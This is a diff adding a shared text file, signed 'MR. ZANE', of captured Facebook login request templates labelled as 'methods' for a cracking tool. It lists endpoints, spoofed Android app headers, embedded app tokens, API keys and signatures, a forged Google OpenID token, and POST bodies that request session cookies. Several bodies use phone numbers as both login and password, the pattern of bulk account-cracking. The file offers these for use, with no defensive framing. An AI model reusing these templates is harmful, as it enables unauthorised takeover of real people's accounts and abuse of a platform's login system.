@@ -1,0 +1,269 @@
+(-) CAPTURED BY MR. ZANE
+
+(-) DEVICE MODELS LINK 1 : https://raw.githubusercontent.com/SABBIR163-XD/data/main/rans.txt
+(-) DEVICE MODELS LINK 2 : https://raw.githubusercontent.com/SABBIR163-XD/MIND-PRO/main/data.txt
+
+(-) MIND TOOL FILE METHOD 1,2,3
+
+ZANE URL : 'b-graph.facebook.com/auth/login'
+
+ZANE HEADERS = {
+'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; LEAGOO Build/QP1A.938875.608) [FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/205281674;FBDM/{density=2.25,width=720,height=1332};FBLC/en_GB;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
+'Accept-Encoding': 'gzip, deflate',
+'Accept': '*/*',
+'Connection': 'keep-alive',
+'method': 'POST',
+'Host': 'b-graph.facebook.com',
+'Priority': 'u=3, i',
+'Content-Type': 'application/x-www-form-urlencoded',
+'X-Fb-Sim-Hni': '64301',
+'X-Fb-Net-Hni': '64301',
+'X-Fb-Connection-Quality': 'EXCELLENT',
+'Zero-Rated': '0',
+'Authorization': 'OAuth null',
+'X-Fb-Connection-Bandwidth': '24807555',
+'X-Fb-Connection-Type': 'MOBILE.LTE',
+'X-Fb-Device-Group': '6060',
+'X-Tigon-Is-Retry': 'False',
+'X-Fb-Friendly-Name': 'authenticate',
+'X-Fb-Request-Analytics-Tags': 'unknown',
+'X-Fb-Http-Engine': 'Liger',
+'X-Fb-Client-Ip': 'True',
+'X-Fb-Server-Cluster': 'True',
+Content-Length': '2115',}
+
+ZANE DATA = {
+    'adid': 'bb18f5d4-0218-42cd-956a-24bc32b9270e',
+    'format': 'json',
+    'device_id': '78eb0a54-64bf-481c-82f3-8bcc5178b649',
+    'email': 'FUCKBY',
+    'password': 'MR. ZANE',
+    'generate_analytics_claim': '1',
+    'community_id': '',
+    'cpl': 'true',
+    'try_num': '1',
+    'family_device_id': '54ac2c0a-e868-4512-b94e-c782b967554a',
+    'secure_family_device_id': 'cb3960ef-0b58-48a3-8c32-2149868f3c8d',
+    'sim_serials': '%5B%2780973453345210784798%27%5D',
+    'openid_flow': 'android_login',
+    'openid_provider': 'google',
+    'openid_emails': '%5B%27FUCK+BY%27%5D',
+    'openid_tokens': '%5B%27eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g%27%5D',
+    'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
+    'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
+    'enroll_misauth': 'false',
+    'generate_session_cookies': '1',
+    'error_detail_type': 'button_with_disabled',
+    'source': 'account_recovery',
+    'generate_machine_id': '1',
+    'jazoest': '2980',
+    'meta_inf_fbmeta': 'V2_UNTAGGED',
+    'advertiser_id': '37a1750c-2d96-4f06-ae81-34bb59ced8d0',
+    'encrypted_msisdn': '',
+    'currently_logged_in_userid': '0',
+    'locale': 'en_US',
+    'client_country_code': 'US',
+    'fb_api_req_friendly_name': 'autheticate',
+    'fb_api_caller_class': 'Fb4aAuthHandler',
+    'api_key': '882a8490361da98702bf97a021ddc14d',
+    'access_token': '256002347743983%257C374e60f8b9bb6b8cbb30f78030438895',
+    'sig': '4c854da0db9429f4913c2a1b221c1d30',}
+
+(-) MIND TOOL FILE METHOD 4
+
+ZANE URL : 'graph.facebook.com/auth/login'
+
+ZANE HEADERS = {
+'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; TRT-LX1 Build/QP1A.748440.394) [FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_PK;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
+'Accept-Encoding': 'gzip, deflate',
+'Accept': '*/*',
+'Connection': 'keep-alive',
+'Host': 'graph.facebook.com',
+'Content-Type': 'application/x-www-form-urlencoded',
+'Priority': 'u=3, i',
+'X-Fb-Sim-Hni': '45204',
+'X-Fb-Net-Hni': '45201',                                             
+'X-Fb-Connection-Quality': 'GOOD',
+'Zero-Rated': '0',
+'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+'X-Fb-Connection-Bandwidth': '24807555',
+'X-Fb-Connection-Type': 'MOBILE.LTE',
+'X-Fb-Device-Group': '5120',
+'X-Tigon-Is-Retry': 'False',
+'X-Fb-Friendly-Name': 'authenticate',
+'X-Fb-Request-Analytics-Tags': 'unknown',
+'X-Fb-Http-Engine': 'Liger',
+'X-Fb-Client-Ip': 'True',
+'X-Fb-Server-Cluster': 'True',
+'Content-Length': '1656',}
+
+ZANE DATA = {
+    'adid': 'shcvEWIHzoNCYZbc',
+    'format': 'json',
+    'device_id': '44c33324-7f02-41a1-a05e-a1aed2f35e58',
+    'family_device_id': '301d9f5e-9217-4fef-8309-103173d1b8af',
+    'secure_family_device_id': '32034c52-91b6-4bdf-b543-aa110daa64e2',
+    'cpl': 'true',
+    'try_num': '1',
+    'email': 'FUCK BY',
+    'password': 'MR. ZANE',
+    'method': 'auth.login',
+    'generate_session_cookies': '1',
+    'sim_serials': '%5B%2780973453345210784798%27%5D',
+    'openid_flow': 'android_login',
+    'openid_provider': 'google',
+    'openid_emails': '%5B%2701710940017%27%5D',
+    'openid_tokens': '%5B%27eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g%27%5D',
+    'error_detail_type': 'button_with_disabled',
+    'source': 'account_recovery',
+    'locale': 'en_US',
+    'client_country_code': 'US',
+    'fb_api_req_friendly_name': 'authenticate',
+    'fb_api_caller_class': 'AuthOperations%24PasswordAuthOperation',}
+
+(-) MIND TOOL RANDOM METHOD 1,2
+
+ZANE URL : 'graph.facebook.com/auth/login'
+
+ZANE HEADERS = {
+'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 8; Moto Build/HUAWEIVOG-L29) [FBAN/FB4A;FBAV/339.0.0.50.119;FBPN/com.facebook.katana;FBLC/tr_TR;FBBV/243660825;FBCR/Vodafone;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/Moto;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2265};FB_FW/1;]',
+'Accept-Encoding': 'gzip, deflate',
+'Accept': '*/*',
+'Connection': 'Keep-Alive',
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': '45204',
+'X-FB-SIM-HNI': '45201',                                             
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+'Content-Length': '1091',}
+
+ZANE DATA = {
+    'email': '01792071886',
+    'password': '01792071886',
+    'adid': 'd16d3342-3ebc-4939-a916-56848de1a7b5',
+    'device_id': 'da6ff7d1-d0be-4f66-9d98-1952c2b6df9e',
+    'family_device_id': '63244d98-ec31-4228-8217-265b089a4db4',
+    'session_id': 'cd1e1187-3512-4b6a-981b-2dbb909a253b',
+    'advertiser_id': '6f1d52bc-c7b6-4ad0-b892-0f937fbf0d7f',
+    'reg_instance': '95c7794a-c780-459b-8011-e8e54647ae9d',
+    'machine_id': 'Jz27jV1zt2TAHxKx8wGWeMFG',
+    'locale': 'en_US',
+    'country_code': 'US',
+    'client_country_code': 'US',
+    'cpl': 'true',
+    'source': 'login',
+    'format': 'json',
+    'credentials_type': 'password',
+    'error_detail_type': 'button_with_disabled',
+    'generate_session_cookies': '1',
+    'generate_analytics_claim': '1',
+    'generate_machine_id': '1',
+    'tier': 'regular',
+    'device': 'SM-F127G',
+    'os_ver': '9',
+    'app_id': '352453765',
+    'app_ver': '398.0.0.21.105',
+    'meta_inf_fbmeta': 'NO_FILE',
+    'currently_logged_in_userid': '0',
+    'fb_api_req_friendly_name': 'authenticate',
+    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+    'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
+    'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
+    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
+    'api_key': '882a8490361da98702bf97a021ddc14d',
+    'sig': '62f8ce9f74b12f84c123cc23437a4a32',}
+    
+(-) MIND TOOL RANDOM METHOD 3
+
+ZANE URL : 'b-graph.facebook.com/auth/login'
+
+ZANE HEADERS = {
+'Host': 'b-graph.facebook.com',                                      
+'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/FB4A;FBAV/112.1.0.28.104;FBPN/com.facebook.katana;FBLC/tr_TR;FBBV/319214973;FBCR/Vodafone;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;]',
+'Accept-Encoding': 'gzip, deflate',                                  
+'Accept': '*/*',
+'Connection': 'keep-alive',
+'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+'X-FB-Friendly-Name': 'authenticate',
+'X-FB-Connection-Bandwidth': '24901',
+'X-FB-Net-HNI': '20544',
+'X-FB-SIM-HNI': '27742',
+'X-FB-Connection-Type': 'unknown',
+'Content-Type': 'application/x-www-form-urlencoded',
+'X-FB-HTTP-Engine': 'Liger',
+'Content-Length': '505',}
+
+ZANE DATA = {
+    'adid': 'f655ea4a-d4d2-441a-8c65-3154b3878cc3',
+    'format': 'json',
+    'device_id': 'eb11a2a9-e324-4cd8-9d23-fbc6feefa465',
+    'email': '01740618544',
+    'password': '01740618544',
+    'generate_analytics_claims': '1',
+    'community_id': '',
+    'cpl': 'true',
+    'try_num': '1',
+    'family_device_id': 'fe02e03e-c42e-4e24-a04a-9358c1710af5',
+    'credentials_type': 'password',
+    'source': 'login',
+    'error_detail_type': 'button_with_disabled',
+    'enroll_misauth': 'false',
+    'generate_session_cookies': '1',
+    'generate_machine_id': '1',
+    'currently_logged_in_userid': '0',
+    'locale': 'en_GB',
+    'client_country_code': 'GB',
+    'fb_api_req_friendly_name': 'authenticate',}
+    
+(-) MIND TOOL RANDOM METHOD 4
+
+ZANE URL : 'b-api.facebook.com/method/auth.login' 
+
+ZANE HEADERS = {
+'Host': 'b-api.facebook.com',                                        
+'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; D6503 Build/QP1A.758591.452) [FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/119894353;FBDM/{density=2.0,width=720,height=1208};FBLC/ar_AR;FBRV/0;FB_FW/2;FBCR/Wataniya;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/CAM-L21;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',            
+'Accept-Encoding': 'gzip, deflate',                                  
+'Accept': '*/*',
+'Connection': 'keep-alive',
+'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+'X-FB-Friendly-Name': 'authenticate',
+'X-FB-Connection-Bandwidth': '31464',
+'X-FB-Net-HNI': '25233',
+'X-FB-SIM-HNI': '29042',
+'X-FB-Connection-Type': 'unknown',
+'Content-Type': 'application/x-www-form-urlencoded',
+'X-FB-HTTP-Engine': 'Liger',
+'Content-Length': '505',}
+
+ZANE DATA = {
+    'adid': '5dcfea0a-3e66-4303-8460-d1a1cc016402',
+    'format': 'json',
+    'device_id': '9d199533-e0d9-47ab-b70a-83790ddc1efe',
+    'email': '01705399857',
+    'password': '01705399857',
+    'generate_analytics_claims': '1',
+    'community_id': '',
+    'cpl': 'true',
+    'try_num': '1',
+    'family_device_id': '5283af71-e0e4-4fe4-ae65-e130c21aa63d',
+    'credentials_type': 'password',
+    'source': 'login',
+    'error_detail_type': 'button_with_disabled',
+    'enroll_misauth': 'false',
+    'generate_session_cookies': '1',
+    'generate_machine_id': '1',
+    'currently_logged_in_userid': '0',
+    'locale': 'en_US',
+    'client_country_code': 'US',
+    'fb_api_req_friendly_name': 'authenticate',}
+
+(-) ENJOY EVERYONE ⚡
